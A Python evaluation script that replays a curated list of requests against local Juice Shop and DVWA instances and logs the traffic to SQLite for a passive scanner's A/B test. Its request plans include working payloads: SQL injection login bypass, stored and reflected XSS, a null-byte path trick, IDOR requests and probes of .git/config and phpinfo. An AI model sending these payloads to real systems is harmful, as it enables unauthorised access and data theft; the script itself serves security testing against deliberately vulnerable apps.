"""Juice Shop traffic generator for the Swarmie A/B eval.

Stands in for Capture/Capture: exercises a curated set of Juice Shop endpoints (vulnerable +
ordinary) and records every request/response pair into a Capture-schema SQLite DB that Swarmie
can tail read-only. This is an *eval* tool — it sends HTTP on purpose, against a local,
deliberately-vulnerable app we control. It is NOT part of Swarmie's passive pipeline, which
never sends traffic; that separation is why it lives under eval/, not rqswarm_eval/.

Usage:
    python3 -m eval.juiceshop.crawl --base http://localhost:3000 --out eval/juiceshop/juiceshop.db
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sqlite3
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlsplit

_SCHEMA = """
CREATE TABLE http_traffic (
    request_id INTEGER PRIMARY KEY, timestamp TEXT, method TEXT, host TEXT,
    path TEXT, query TEXT, param_count INTEGER, param_names TEXT,
    status_code INTEGER, response_length INTEGER, content_type TEXT,
    extension TEXT, protocol TEXT, url TEXT, request_hash TEXT
);
CREATE TABLE http_messages (
    request_id INTEGER PRIMARY KEY, request_headers TEXT, request_body BLOB,
    response_headers TEXT, response_body BLOB
);
"""

# Curated request plan. {token} is substituted with the Bearer captured from the SQLi login.
# Covers: SQLi (login + search), IDOR (baskets/users), exposed admin config + metrics + ftp,
# stored-XSS feedback, open redirect, JWT issuance, error/stack disclosure, admin routes.
_PLAN = [
    ("GET", "/", None, False),
    ("GET", "/robots.txt", None, False),
    ("GET", "/sitemap.xml", None, False),
    ("GET", "/.well-known/security.txt", None, False),
    ("GET", "/api/Challenges", None, False),
    ("GET", "/rest/admin/application-version", None, False),
    ("GET", "/rest/admin/application-configuration", None, False),
    ("GET", "/metrics", None, False),
    ("GET", "/api/Products", None, False),
    ("GET", "/api/Products/1", None, False),
    ("GET", "/rest/products/search?q=apple", None, False),
    ("GET", "/rest/products/search?q=%27))--", None, False),          # SQLi payload -> error
    ("GET", "/api/Products/abc", None, False),                        # type error -> stack
    # SQLi auth bypass — returns the admin JWT; the response Authorization/token feeds {token}.
    ("POST", "/rest/user/login", {"email": "' OR 1=1--", "password": "x"}, False),
    ("GET", "/rest/user/whoami", None, True),
    ("GET", "/api/Users", None, True),
    ("GET", "/api/Users/1", None, True),
    ("GET", "/rest/basket/1", None, True),                            # IDOR
    ("GET", "/rest/basket/2", None, True),                            # IDOR (other user)
    ("GET", "/api/BasketItems", None, True),
    ("GET", "/api/Cards", None, True),
    ("GET", "/api/Addresss", None, True),
    ("GET", "/api/SecurityQuestions", None, False),
    ("GET", "/api/Feedbacks", None, False),
    ("POST", "/api/Feedbacks", {"comment": "<script>alert(1)</script>", "rating": 1}, True),
    ("GET", "/rest/products/1/reviews", None, False),
    ("GET", "/ftp", None, False),
    ("GET", "/ftp/legal.md", None, False),
    ("GET", "/ftp/package.json.bak%2500.md", None, False),           # poison null byte
    ("GET", "/redirect?to=https://example.com", None, False),
    ("GET", "/rest/admin/application-configuration", None, True),
]

# DVWA (a cookie + server-rendered-HTML target) — exercises the cookie and HTML-DOM lanes that
# Juice Shop's JWT-in-body SPA never touches. All GET, no auth needed to capture cookies/HTML.
_DVWA_PLAN = [
    ("GET", "/", None, False),
    ("GET", "/login.php", None, False),
    ("GET", "/setup.php", None, False),
    ("GET", "/instructions.php", None, False),
    ("GET", "/security.php", None, False),
    ("GET", "/robots.txt", None, False),
    ("GET", "/README.md", None, False),
    ("GET", "/vulnerabilities/xss_r/?name=<script>alert(1)</script>", None, False),
    ("GET", "/config/", None, False),
    ("GET", "/phpinfo.php", None, False),
    ("GET", "/.git/config", None, False),
    ("GET", "/docs/", None, False),
]

_PLANS = {"juiceshop": _PLAN, "dvwa": _DVWA_PLAN}


def _headers_text(items) -> str:
    return "".join(f"{k}: {v}\r\n" for k, v in items)


def _do(method, url, body, token):
    headers = {"Accept": "application/json, text/plain, */*", "User-Agent": "swarmie-eval/1"}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except (urllib.error.URLError, TimeoutError) as e:
        return 0, {}, str(e).encode()


def crawl(base: str, out: Path, plan=_PLAN) -> dict:
    if out.exists():
        out.unlink()
    out.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(out)
    conn.executescript(_SCHEMA)
    host = urlsplit(base).netloc
    token = ""
    rid = 0
    fired = {"rows": 0, "token": False, "statuses": {}}
    for method, path, body, need_auth in plan:
        rid += 1
        url = base + path
        sp = urlsplit(url)
        status, resp_headers, resp_body = _do(method, url, body, token if need_auth else "")
        # capture the Bearer from the SQLi login response
        if path == "/rest/user/login" and status == 200:
            try:
                token = json.loads(resp_body).get("authentication", {}).get("token", "")
                fired["token"] = bool(token)
            except (ValueError, AttributeError):
                pass
        req_body = json.dumps(body).encode() if body is not None else b""
        req_headers = _headers_text([("Host", host), ("Accept", "application/json"),
                                     ("Authorization", "Bearer <redacted>") if need_auth and token else ("X-Eval", "1")])
        params = sp.query.split("&") if sp.query else []
        pnames = ",".join(sorted(p.split("=")[0] for p in params if p))
        ext = Path(sp.path).suffix.lstrip(".")
        conn.execute("INSERT INTO http_traffic VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (
            rid, f"2026-08-29T21:00:{rid:02d}Z", method, host, sp.path, sp.query,
            len(params), pnames, status, len(resp_body),
            resp_headers.get("Content-Type", ""), ext, "HTTP/1.1", url,
            hashlib.sha256(f"{method} {url}".encode() + req_body).hexdigest(),
        ))
        conn.execute("INSERT INTO http_messages VALUES (?,?,?,?,?)", (
            rid, req_headers, req_body, _headers_text(resp_headers.items()), resp_body,
        ))
        fired["rows"] += 1
        fired["statuses"][str(status)] = fired["statuses"].get(str(status), 0) + 1
    conn.commit()
    conn.close()
    return fired


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Generate Juice Shop traffic into a Capture-schema DB")
    ap.add_argument("--base", default="http://localhost:3000")
    ap.add_argument("--out", default="eval/juiceshop/juiceshop.db")
    ap.add_argument("--target", default="juiceshop", choices=sorted(_PLANS))
    args = ap.parse_args(argv)
    result = crawl(args.base, Path(args.out), _PLANS[args.target])
    print(json.dumps({"db": args.out, **result}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
